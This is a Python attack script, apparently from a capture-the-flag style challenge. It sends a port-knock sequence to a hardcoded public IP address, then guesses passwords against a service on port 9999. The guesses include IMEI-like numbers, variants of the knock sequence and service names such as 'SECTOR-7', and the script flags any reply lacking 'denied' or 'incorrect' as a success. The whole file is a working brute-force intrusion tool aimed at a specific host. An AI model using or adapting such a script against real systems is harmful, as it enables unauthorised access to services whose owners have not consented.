#!/usr/bin/env python3
"""
Ultra simple - maybe the password IS the knock sequence or related
"""

import socket
import time

TARGET_IP = "13.206.58.35"
KNOCK_SEQUENCE = [9000, 2600, 1337]
SERVICE_PORT = 9999

def knock_ports():
    for port in KNOCK_SEQUENCE:
        try:
            s = socket.socket()
            s.settimeout(0.3)
            s.connect((TARGET_IP, port))
            s.close()
        except:
            pass
        time.sleep(0.2)

def try_pwd(pwd):
    try:
        knock_ports()
        time.sleep(0.3)
        
        s = socket.socket()
        s.settimeout(3)
        s.connect((TARGET_IP, SERVICE_PORT))
        
        s.recv(4096)
        s.send((pwd + "\n").encode())
        time.sleep(0.3)
        
        resp = s.recv(4096).decode('utf-8', errors='ignore')
        s.close()
        
        if "denied" not in resp.lower() and "incorrect" not in resp.lower():
            print(f"\n[!!!] SUCCESS: '{pwd}'")
            print(resp)
            return True
        return False
    except:
        return False

# Ultra simple attempts
passwords = [
    # Maybe it's literally asking for IMEI
    "356000000000000",  # Generic IMEI starting pattern
    "353000000000000",
    "354000000000000",
    "355000000000000",
    "357000000000000",
    "358000000000000",
    "359000000000000",
    
    # Or maybe the password is empty/just enter
    "",
    " ",
    
    # Or maybe it's the knock sequence in different formats
    "9000 2600 1337",
    "9000,2600,1337",
    "9000:2600:1337",
    "9000|2600|1337",
    "9000.2600.1337",
    "9000/2600/1337",
    
    # Without separators
    "900026001337",
    
    # Reversed
    "133726009000",
    "1337-2600-9000",
    
    # As hex
    "2328 0a28 0539",  # hex of 9000, 2600, 1337
    "23280a280539",
    
    # As a phone number format
    "(9000) 2600-1337",
    "9000-2600-1337",
    "+9000-2600-1337",
    
    # Maybe it's asking for the PROTOCOL name
    "knock",
    "portknock",
    "port-knock",
    "knockknock",
    
    # Or the service name
    "SECTOR-7",
    "SECTOR7",
    "sector-7",
    "sector7",
    "S3CTOR-7",
    "s3ctor7",
    
    # Deep Access Protocol
    "DeepAccessProtocol",
    "deepaccessprotocol",
    "DAP",
    "dap",
]

print("[*] Ultra Simple Password Test\n")

for pwd in passwords:
    print(f"[*] '{pwd}'", end="... ")
    if try_pwd(pwd):
        break
    else:
        print("✗")
    time.sleep(0.3)
